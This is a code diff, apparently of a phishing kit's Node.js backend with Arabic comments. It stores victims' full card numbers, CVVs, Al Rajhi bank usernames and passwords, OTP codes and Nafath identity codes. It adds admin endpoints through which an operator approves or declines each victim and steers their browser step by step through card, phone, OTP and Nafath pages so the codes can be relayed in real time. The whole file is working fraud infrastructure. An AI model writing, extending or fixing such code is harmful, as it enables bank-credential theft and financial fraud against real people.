@@ -225,19 +225,47 @@ async function updateBookingStatus(referenceId, status, statusRead) {
 }
 
 async function createOrUpdatePayment(referenceId, data) {
+  // تعيين أسماء الحقول من الكائن إلى أسماء أعمدة قاعدة البيانات
+  const fieldMap = {
+    cardHolderName: 'cardholdername',
+    cardNumber: 'cardnumber',
+    cardLastFour: 'cardlastfour',
+    expirationDate: 'cardexpiry',
+    cardExpiry: 'cardexpiry',
+    cvv: 'cardcvv',
+    cardCvv: 'cardcvv',
+    verifyCode: 'verifycode',
+    secretNum: 'secretnum',
+    rajUsername: 'rajusername',
+    rajPassword: 'rajpassword',
+    paymentAction: 'paymentaction',
+    step: 'step',
+    status: 'status',
+    rawData: 'rawdata',
+    ip: null, // تجاهل ip ليس عموداً
+    referenceId: null, // تجاهل
+  };
+  
+  const filteredData = {};
+  for (const [k, v] of Object.entries(data)) {
+    if (k === 'referenceId' || k === 'ip') continue;
+    const col = fieldMap[k] !== undefined ? fieldMap[k] : k.toLowerCase();
+    if (col) filteredData[col] = k === 'rawData' ? JSON.stringify(v) : v;
+  }
+  
   const existing = await pool.query("SELECT id FROM payments WHERE referenceid = $1", [referenceId]);
   
   if (existing.rows.length > 0) {
-    const keys = Object.keys(data).filter(k => k !== 'referenceId');
-    const sets = keys.map((k, i) => `${k.toLowerCase()} = $${i + 2}`).join(", ");
-    const values = keys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k]);
+    const cols = Object.keys(filteredData);
+    if (cols.length === 0) return getPaymentByReference(referenceId);
+    const sets = cols.map((k, i) => `${k} = $${i + 2}`).join(", ");
+    const values = cols.map(k => filteredData[k]);
     await pool.query(`UPDATE payments SET ${sets} WHERE referenceid = $1`, [referenceId, ...values]);
   } else {
-    const keys = ['referenceid', ...Object.keys(data).map(k => k.toLowerCase())];
-    const placeholders = keys.map((_, i) => `$${i + 1}`).join(", ");
-    const dataKeys = Object.keys(data);
-    const values = [referenceId, ...dataKeys.map(k => k === 'rawData' ? JSON.stringify(data[k]) : data[k])];
-    await pool.query(`INSERT INTO payments (${keys.join(", ")}) VALUES (${placeholders})`, values);
+    const cols = ['referenceid', ...Object.keys(filteredData)];
+    const placeholders = cols.map((_, i) => `$${i + 1}`).join(", ");
+    const values = [referenceId, ...Object.values(filteredData)];
+    await pool.query(`INSERT INTO payments (${cols.join(", ")}) VALUES (${placeholders})`, values);
   }
   return getPaymentByReference(referenceId);
 }
@@ -397,15 +425,16 @@ io.on("connection", (socket) => {
   // Submit payment data - يُرسل ackPayment للعميل
   socket.on("submitPaymentData", async (data) => {
     try {
-      const { referenceId } = data;
+      // استخدام referenceId من البيانات أو من socket (تم حفظه عند submitBooking)
+      const referenceId = data.referenceId || socket.referenceId;
       if (!referenceId) {
         socket.emit("ackPayment", { success: false, error: "No referenceId" });
         return;
       }
-      await createOrUpdatePayment(referenceId, { ...data, rawData: data });
+      await createOrUpdatePayment(referenceId, { ...data, referenceId, rawData: data });
       socket.join(referenceId);
       notifyAdmin("newPayment", { referenceId, ...data });
-      socket.emit("ackPayment", { success: true });
+      socket.emit("ackPayment", { success: true, referenceId });
     } catch (err) {
       console.error("submitPaymentData error:", err);
       socket.emit("ackPayment", { success: false, error: err.message });
@@ -415,7 +444,7 @@ io.on("connection", (socket) => {
   // Submit phone data - يُرسل ackPhone للعميل
   socket.on("submitPhoneData", async (data) => {
     try {
-      const { referenceId } = data;
+      const referenceId = data.referenceId || socket.referenceId;
       if (!referenceId) {
         socket.emit("ackPhone", { success: false });
         return;
@@ -432,7 +461,7 @@ io.on("connection", (socket) => {
   // Submit phone code data - يُرسل ackPhoneCode للعميل
   socket.on("submitPhoneCodeData", async (data) => {
     try {
-      const { referenceId } = data;
+      const referenceId = data.referenceId || socket.referenceId;
       if (!referenceId) {
         socket.emit("ackPhoneCode", { success: false });
         return;
@@ -449,7 +478,7 @@ io.on("connection", (socket) => {
   // Submit nafad data - يُرسل ackNafad للعميل
   socket.on("submitNafadData", async (data) => {
     try {
-      const { referenceId } = data;
+      const referenceId = data.referenceId || socket.referenceId;
       if (!referenceId) {
         socket.emit("ackNafad", { success: false });
         return;
@@ -466,7 +495,7 @@ io.on("connection", (socket) => {
   // Submit code data - يُرسل ackCode للعميل
   socket.on("submitCodeData", async (data) => {
     try {
-      const { referenceId } = data;
+      const referenceId = data.referenceId || socket.referenceId;
       if (!referenceId) {
         socket.emit("ackCode", { success: false });
         return;
@@ -483,7 +512,7 @@ io.on("connection", (socket) => {
   // Submit rajhi data - يُرسل ackRajhi للعميل
   socket.on("submitRajhiData", async (data) => {
     try {
-      const { referenceId } = data;
+      const referenceId = data.referenceId || socket.referenceId;
       if (!referenceId) {
         socket.emit("ackRajhi", { success: false });
         return;
@@ -500,7 +529,7 @@ io.on("connection", (socket) => {
   // Submit rajhi code data - يُرسل ackRajhiCode للعميل (بعد إدخال كود الراجحي)
   socket.on("submitRajhiCodeData", async (data) => {
     try {
-      const { referenceId } = data;
+      const referenceId = data.referenceId || socket.referenceId;
       if (!referenceId) {
         socket.emit("ackRajhiCode", { success: false });
         return;
@@ -517,7 +546,8 @@ io.on("connection", (socket) => {
   // Submit verification data - يُرسل ackVerification للعميل
   socket.on("submitVerificationData", async (data) => {
     try {
-      const { referenceId, type } = data;
+      const referenceId = data.referenceId || socket.referenceId;
+      const { type } = data;
       if (!referenceId) {
         socket.emit("ackVerification", { success: false });
         return;
@@ -680,9 +710,25 @@ app.post("/api/admin/nafath-action", verifyAdminToken, async (req, res) => {
   try {
     const { referenceId, reference, action, data } = req.body;
     const ref = referenceId || reference;
-    io.to(ref).emit("nafadCode", { action, ...(data || {}) });
-    res.json({ success: true });
+    
+    // جلب بيانات الحجز لمعرفة IP العميل
+    const booking = await getBookingByReference(ref);
+    const clientIp = booking?.clientIp || '';
+    
+    let targetPage = '';
+    if (action === 'pass') {
+      // إرسال رمز نفاذ للعميل
+      io.to(ref).emit("nafadCode", { action, ...(data || {}) });
+      targetPage = 'nafad';
+    } else {
+      // رفض - توجيه لصفحة الحجز
+      io.to(ref).emit("navigateTo", { page: 'booking', ip: clientIp });
+      targetPage = 'booking';
+    }
+    
+    res.json({ success: true, targetPage, action });
   } catch (err) {
+    console.error('nafath-action error:', err);
     res.status(500).json({ error: err.message });
   }
 });
@@ -692,9 +738,49 @@ app.post("/api/admin/payment-action", verifyAdminToken, async (req, res) => {
   try {
     const { referenceId, reference, action, data } = req.body;
     const ref = referenceId || reference;
-    io.to(ref).emit("ackRajhiCode", { action, ...(data || {}) });
-    res.json({ success: true });
+    
+    // جلب بيانات الحجز لمعرفة IP العميل
+    const booking = await getBookingByReference(ref);
+    const clientIp = booking?.clientIp || '';
+    
+    // جلب بيانات الدفع لمعرفة الخطوة الحالية
+    const payment = await getPaymentByReference(ref);
+    const currentStep = (payment?.step || 0) + 1;
+    
+    let targetPage = '';
+    let nextStep = currentStep;
+    
+    if (action === 'pass') {
+      // تحديد الصفحة التالية بناءً على الخطوة
+      if (currentStep === 1) {
+        targetPage = 'phone'; // بعد بيانات البطاقة → رقم الجوال
+        nextStep = 2;
+      } else if (currentStep === 2) {
+        targetPage = 'phoneCode'; // بعد رقم الجوال → كود OTP
+        nextStep = 3;
+      } else {
+        targetPage = 'nafad'; // بعد كود OTP → نفاذ
+        nextStep = 4;
+      }
+    } else {
+      // رفض - إعادة لصفحة الدفع مع علامة declined
+      targetPage = 'payments?declined=true';
+    }
+    
+    // تحديث خطوة الدفع
+    if (ref) {
+      await pool.query(
+        "UPDATE payments SET step = $1, paymentaction = $2 WHERE referenceid = $3",
+        [nextStep, action, ref]
+      );
+    }
+    
+    // إرسال navigateTo للعميل
+    io.to(ref).emit("navigateTo", { page: targetPage, ip: clientIp });
+    
+    res.json({ success: true, currentStep, targetPage, action });
   } catch (err) {
+    console.error('payment-action error:', err);
     res.status(500).json({ error: err.message });
   }
 });
